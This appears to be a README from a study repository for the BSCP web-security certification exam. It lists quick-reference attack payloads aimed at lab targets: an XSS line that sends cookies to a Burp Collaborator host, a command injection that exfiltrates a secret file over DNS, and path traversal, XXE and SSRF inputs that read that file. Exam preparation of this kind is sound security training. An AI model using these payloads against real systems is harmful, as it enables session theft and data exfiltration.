# Payloads Collection

Quick reference for common BSCP exam payloads.

## Files

- [`xss.md`](xss.md) - XSS payloads for cookie stealing and bypass techniques
- [`os-command-injection.md`](os-command-injection.md) - Command injection with DNS exfiltration
- [`path-traversal.md`](path-traversal.md) - Path traversal and bypass techniques
- [`ssti.md`](ssti.md) - Server-Side Template Injection for all major engines

## Quick Tips

### XSS
```html
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### Command Injection (DNS Exfiltration)
```bash
||nslookup $(cat /home/carlos/secret).burp.oastify.com||
```

### Path Traversal
```
../../../home/carlos/secret
```

### SSTI Detection
```
{{7*7}}
```

### XXE
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### SSRF (Exam-Specific)
```
http://localhost:6566/home/carlos/secret
```

## Remember

- Always use **Burp Collaborator** for out-of-band attacks
- Replace `burp.oastify.com` with your collaborator URL
- **DNS exfiltration** is most reliable for command injection
- **SQLMap** with `--level 5 --risk 3` for SQL injection
- **Burp Scanner** finds most vulnerabilities automatically
